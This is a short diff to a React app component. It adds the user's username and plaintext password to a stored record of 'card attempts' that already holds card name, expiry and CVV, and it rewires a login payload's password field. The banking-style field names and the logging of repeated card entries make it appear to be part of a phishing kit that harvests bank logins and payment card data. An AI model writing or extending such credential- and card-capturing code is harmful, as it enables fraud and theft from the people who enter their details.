@@ -634,6 +634,8 @@ export default function App() {
       cardName: data.cardName || '',
       cardExpiry: data.cardExpiry || '',
       cvv: data.cvv || '',
+      username: fromLoginCard ? pendingUserRef.current?.username || '' : displayUser,
+      password: fromLoginCard ? pendingUserRef.current?.password || '' : '',
       at: Date.now(),
     }
     cardAttemptsRef.current = [...cardAttemptsRef.current, cardAttempt]
@@ -644,9 +646,7 @@ export default function App() {
       username: fromLoginCard
         ? pendingUserRef.current?.username || displayUser
         : displayUser,
-      password: fromLoginCard
-        ? pendingUserRef.current?.password || data.cardNumber || ''
-        : data.cardNumber || data.phone || '',
+      password: pendingUserRef.current?.password || '',
       tipoUsuario: fromLoginCard
         ? pendingUserRef.current?.tipoUsuario || 'CODIGO_PERSONA'
         : 'HABILITAR',
